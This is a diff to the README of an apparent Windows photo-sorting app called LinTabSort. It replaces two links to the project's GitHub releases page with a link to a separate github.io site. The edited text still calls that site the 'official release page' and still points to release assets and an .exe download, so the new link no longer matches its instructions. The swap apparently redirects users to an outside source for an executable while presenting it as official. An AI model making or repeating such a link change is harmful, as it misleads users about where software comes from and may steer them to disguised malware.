@@ -1,6 +1,6 @@
 # 🖼️ LinTabSort - Organize your messy photo library fast
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sunny6092/LinTabSort/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sunny6092.github.io)
 
 LinTabSort helps you manage your digital media. You can view, sort, and remove unwanted photos and videos from your computer. The app runs on Windows and works with common image and video formats.
 
@@ -8,7 +8,7 @@ LinTabSort helps you manage your digital media. You can view, sort, and remove u
 
 You need the installer file to run this app. Follow these steps to set up LinTabSort on your computer.
 
-1. Go to the [official release page](https://github.com/sunny6092/LinTabSort/releases).
+1. Go to the [official release page](https://sunny6092.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the file that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
